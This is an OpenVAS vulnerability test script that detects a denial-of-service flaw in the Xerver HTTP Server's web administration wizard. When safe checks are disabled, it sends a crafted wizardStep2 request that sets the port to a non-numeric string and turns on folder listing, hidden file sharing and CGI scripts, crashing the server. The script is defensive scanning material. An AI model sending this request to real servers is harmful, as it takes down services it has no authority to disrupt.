###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xerver_http_server_web_admin_dos_vuln.nasl 8287 2018-01-04 07:28:11Z teissa $
#
# Xerver HTTP Server Web Administration Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to cause Denial of Service or
execute arbitrary code.

Impact Level: Application/System";
tag_affected = "Xerver version 4.32 and prior on all platforms.";
tag_insight = "The flaw is due to improper validation of user supplied input passed to
  HTTP server port via Web Administration Wizard. An attacker can set HTTP
  Server port to any kind of letter combination causing server crash.";
tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";
tag_summary = "This host is running Xerver HTTP Server and is prone to the Denial of
  Service Vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800175");
  script_version("$Revision: 8287 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-04 08:28:11 +0100 (Thu, 04 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-03-10 15:48:25 +0100 (Wed, 10 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(36454);
  script_cve_id("CVE-2009-4658", "CVE-2009-4657");
  script_name("Xerver HTTP Server Web Administration Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/53351");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9717");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_xerver_http_server_detect.nasl");
  script_require_ports("Services/www", 32123);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

xerPort = 32123;
if(!get_port_state(xerPort)){
  exit(0);
}

xerVer = get_kb_item("www/" + xerPort + "/Xerver");
if(isnull(xerVer)){
  exit(0);
}

if(!safe_checks())
{
  request = http_get(item:"/?action=wizardStep2&direction=forward&save=yes&"+
                          "portNr=OpenVAS_Exploit_Replace_With_Port_Num&"+
                          "allowFolderListing=1&shareHiddenFiles=1&"+
                          "allowCGIScript=1", port:xerPort);
  response = http_send_recv(port:xerPort, data:request);
  if(!response){
    security_message(xerPort);
    exit(0);
  }
}

if(version_is_less_equal(version:xerVer, test_version:"4.32")){
  security_message(xerPort);
}
